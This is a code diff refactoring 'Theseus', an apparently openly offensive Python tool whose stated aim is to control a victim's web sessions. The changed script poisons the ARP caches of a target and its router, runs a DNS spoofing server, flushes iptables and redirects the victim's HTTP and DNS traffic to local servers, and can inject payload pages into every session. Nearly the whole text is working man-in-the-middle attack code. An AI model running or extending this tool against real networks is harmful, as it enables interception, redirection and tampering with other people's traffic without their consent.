@@ -1,4 +1,5 @@
 import os
+import re
 import sys
 import socket
 import argparse
@@ -6,50 +7,45 @@ import threading
 import configparser
 import multiprocessing
 from arp.arp import Arp_Spoof
+from logger.logger import Logger
 from arp.ping import Arp_Ping
 from banner.banner import New_Banner
-from server.server import HTTP_Server, SSL_Server
+from server.server import HTTP_Server
 from dns.dns import Decode_Packet, DNS_Server
 
 class Theseus(object):
 	"""Theseus Control A Victims Web Sessions"""
 	def __init__(self):
-		global args, arp, http_Server, ssl_Server, local, router, verbose, html_file, cfg, bhttp, bssl, payloads_folder
+		global args, arp, http_Server, ssl_Server, local, router, verbose, html_file, cfg, bhttp, bssl, payloads_folder, log, tm
 		super(Theseus, self).__init__()
+		log = Logger()
 
-		ap = argparse.ArgumentParser(description="Theseus")
-		ap.add_argument("-t", "--target", help="This is the targets ip address", required=True)
-		ap.add_argument("-i", "--interface", help="This is the network cards current interface", required=True)
+		ap = argparse.ArgumentParser(description="Theseus", add_help=True)
+		ap.add_argument("--target", help="This is the targets ip address", required=True)
+		ap.add_argument("--iface", help="This is the network cards current interface", required=True)
+		ap.add_argument("--target-mac", help="This is the targets mac address", required=False)
+		ap.add_argument('--arp-ping', action='store_const', const=sum, help='This will get the targets mac address via a discret arp ping')
+		ap.add_argument('--force-content', action='store_const', const=sum, help='This option will force a custom website into each session')
+		ap.add_argument("--spoof", help="Type of spoof (arp)", required=True)
 		args = ap.parse_args()
 
-		sys.stdout.write("[\033[1;34m+\033[00m] Configuring iptables... ")
+		log.status("Configuring iptables")
 		cfg = configparser.RawConfigParser()
 		cfile = 'theseus.cfg'
 		cfg.read(cfile)
-		ip_forward = cfg.get('IPTables-Settings', 'path_to_ip_forward')
-		rhttp = cfg.get('IPTables-Settings', 'Receive_HTTP_Port')
-		rssl = cfg.get('IPTables-Settings', 'Receive_SSL_Port')
-		bhttp = cfg.get('Server-Settings', 'Bind_HTTP_Port')
-		bssl = cfg.get('Server-Settings', 'Bind_SSL_Port')
-		rdns = cfg.get('IPTables-Settings', 'Receive_DNS_Port')
-		bdns = cfg.get('DNS-Spoof-Settings', 'Bind_DNS_Port')
 		#Configure kernal and iptables for the attack
-		os.popen("{ echo 0 > "+ip_forward+";\
+		os.popen("{ echo 0 > /proc/sys/net/ipv4/ip_forward;\
 					iptables --flush;\
 					iptables --flush -t nat;\
-					iptables -t nat -A PREROUTING -p tcp --destination-port "+rhttp+" -j REDIRECT --to-port "+bhttp+";\
-					iptables -t nat -A PREROUTING -p tcp --destination-port "+rssl+" -j REDIRECT --to-port "+bssl+";\
-					iptables -t nat -A PREROUTING -p udp --destination-port "+rdns+" -j REDIRECT --to-port "+bdns+"; }") #Changed IP Forwarding
-		sys.stdout.write("done\n")
+					iptables -t nat -A PREROUTING -p tcp --destination-port 80 -j REDIRECT --to-port 9000;\
+					iptables -t nat -A PREROUTING -p udp --destination-port 53 -j REDIRECT --to-port 5000; }") #Changed IP Forwarding
 
 		# Load Setting From Config file
-		sys.stdout.write("[\033[1;34m+\033[00m] Reading configuration file... ")
+		log.status("Reading configuration file")
 		router = cfg.get('Arp-Spoof-Settings', 'routers_ip_address')
 		local = cfg.get('Theseus-Settings', 'local_ip_address')
-		verbose = cfg.get('Arp-Spoof-Settings', 'verbose')
-		html_file = cfg.get('Server-Settings', 'Html_Payload_Path')
-		payloads_folder = cfg.get('Server-Settings', 'Payloads_folder')
-		sys.stdout.write("done\n")
+		payloads_folder = 'server/Payloads'
+		verbose = 5
 
 		#Handle any possable errors from args
 		try:
@@ -63,12 +59,18 @@ class Theseus(object):
 		except socket.error:
 			print("\033[1;31mIncorrect IP address\033[00m")
 			exit()
-		try:
-			with open(html_file, 'r') as file:
-				file.read()
-		except:
-			print("\033[1;31mError Opening file\033[00m")
-			exit()
+		
+		if args.target_mac:
+			if re.match("[0-9a-f]{2}([-:])[0-9a-f]{2}(\\1[0-9a-f]{2}){4}$", args.target_mac) != None:
+				tm = args.target_mac
+				pass
+			else:
+				print("\033[1;31mInvalid mac address\033[00m")
+				tm = None
+				exit()
+		else: 
+			pass
+
 
 	def dns_spoof(self, dns, *args):
 		redirect_ip = args[0]
@@ -77,86 +79,82 @@ class Theseus(object):
 			dns.send_reply(addr, raw, redirect_ip)
 
 	def attack_dns_spoof(self):
-		if bool(cfg.get('DNS-Spoof-Settings', 'Running')) == True:
-			local = cfg.get('Theseus-Settings', 'local_ip_address')
-			dns = DNS_Server(local)
-			jobs = []
-			for i in range(4):
-		   		p = multiprocessing.Process(target=self.dns_spoof, args=(dns, local))
-		   		jobs.append(p)
-		   		p.start()
+		local = cfg.get('Theseus-Settings', 'local_ip_address')
+		dns = DNS_Server(local)
+		jobs = []
+		for i in range(4):
+	   		p = multiprocessing.Process(target=self.dns_spoof, args=(dns, local))
+	   		jobs.append(p)
+	   		p.start()
 
-	def attack_arp_to_content_force_Server(self):
-		if bool(cfg.get('Arp-Spoof-Settings', 'Running')) == True:
-			arp = Arp_Spoof(args.interface)
 
-			p = Arp_Ping(args.interface)
-			sys.stdout.write("[\033[1;34m+\033[00m] Sending arp ping to {} \n".format(args.target))
-			p.ping(args.target, local, args.interface)
-			while True:
-				tm = p.await_responce(args.interface)
-				try:
-					if len(tm) != 0:
-						break
-				except TypeError: pass
-			tm = tm[0]
+	def arp_spoof(self, tm):
+			arp = Arp_Spoof(args.iface)
 			try:
-				sys.stdout.write("[\033[1;32m+\033[00m] {} ({}) is at {}\n".format(socket.gethostbyaddr(args.target)[0], args.target, tm))
+				log.status("{} ({}) is at {}".format(socket.gethostbyaddr(args.target)[0], args.target, tm))
 			except socket.herror:
-				sys.stdout.write("[\033[1;32m+\033[00m] {} is at {}\n".format(args.target, tm))
+				log.warn("{} is at {}".format(args.target, tm))
 
 			ajobs = []
-			victim_thread = multiprocessing.Process(target=arp.poison_victim, args=(args.target, router, int(verbose), args.interface, tm))
+			victim_thread = multiprocessing.Process(target=arp.poison_victim, args=(args.target, router, int(verbose), args.iface, tm))
 			ajobs.append(victim_thread)
 			victim_thread.start()
 			try:
 				vname = socket.gethostbyaddr(args.target)[0]
 				vname = vname.replace('.home', " ")
-				sys.stdout.write("[\033[1;32m+\033[00m] Started attack on {}\n".format(vname))
+				log.status("Started attack on {}".format(vname))
 			except socket.herror:
-				sys.stdout.write("[\033[1;32m+\033[00m] Started attack on {}\n".format(args.target))
+				log.warn("Started attack on {}".format(args.target))
 
-			target_thread = multiprocessing.Process(target=arp.poison_router, args=(router, args.target, int(verbose), args.interface, tm))
+			target_thread = multiprocessing.Process(target=arp.poison_router, args=(router, args.target, int(verbose), args.iface, tm))
 			ajobs.append(victim_thread)
 			target_thread.start()
 			try:
 				rname = socket.gethostbyaddr(router)[0]
 				rname = rname.replace('.home', " ")
-				sys.stdout.write("[\033[1;32m+\033[00m] Started attack on {}\n".format(rname))
+				log.status("Started attack on {}".format(rname))
 			except socket.herror:
-				sys.stdout.write("[\033[1;32m+\033[00m] Started attack on {}\n".format(args.target))
+				log.warn("Started attack on {}".format(args.target))
 
-		if bool(cfg.get('Server-Settings', 'Running')) == True:
-			cert = cfg.get('Server-Settings', 'SSl_Certificate')
-			key = cfg.get('Server-Settings', 'SSl_Key')
+	def arp_ping(self):
+		p = Arp_Ping(args.iface)
+		p.ping(args.target, local, args.iface)
+		while True:
+			tm = p.await_responce(args.iface)
+			try:
+				if len(tm) != 0:
+					break
+			except TypeError: pass
+		return tm[0]
 
-			http_Server = HTTP_Server(local, int(bhttp), html_file)
-			sys.stdout.write("[\033[1;34m+\033[00m] Started HTTP Server on port {}\n".format(bhttp))
-			
-			ssl_Server = SSL_Server(local, int(bssl), html_file, cert, key)
-			sys.stdout.write("[\033[1;34m+\033[00m] Started SSL Server on port {}\n".format(bssl))
-			sys.stdout.write("[\033[1;34m+\033[00m] Attack Ready...\n\n")
+	def force_content(self):
+		http_Server = HTTP_Server(local, payloads_folder)
+		log.status("Started HTTP server on port 9000\n")
 
-			jobs = []
-			for i in range(4):
-		   		p = multiprocessing.Process(target=http_Server._http_client_handler, args=(payloads_folder))
-		   		jobs.append(p)
-		   		p.start()
-		   		p2 = multiprocessing.Process(target=ssl_Server._ssl_client_handler())
-		   		jobs.append(p2)
-		   		p2.start()
-
+		jobs = []
+		for i in range(4):
+	   		p = multiprocessing.Process(target=http_Server._http_client_handler, args=(payloads_folder))
+	   		jobs.append(p)
+	   		p.start()
 
 if __name__ == '__main__':
 	b = New_Banner()
-	sys.stdout.write("\033[1;3m"+b.new()+"\033[00m\n")
+	print("\033[1;3m"+b.new()+"\033[00m")
 	t = Theseus()
-	try:
-		sys.stdout.write("[\033[1;34m+\033[00m] Starting DNS Server... ")
-		t.attack_dns_spoof()
-		sys.stdout.write("done\n")
-		t.attack_arp_to_content_force_Server()
-	except KeyboardInterrupt:
-		exit()
 
-#
+	t.attack_dns_spoof()
+	log.status("Started DNS server")
+
+	if args.arp_ping:
+		log.status("Sending arp ping to {}".format(args.target))
+		tm = t.arp_ping()
+
+	if 'arp' in args.spoof:
+		try:
+			t.arp_spoof(tm)
+		except NameError:
+			log.critical("Theseus must have a mac address for the target... (--target-mac, --arp-ping)")
+			exit()
+
+	if args.force_content:
+		t.force_content()
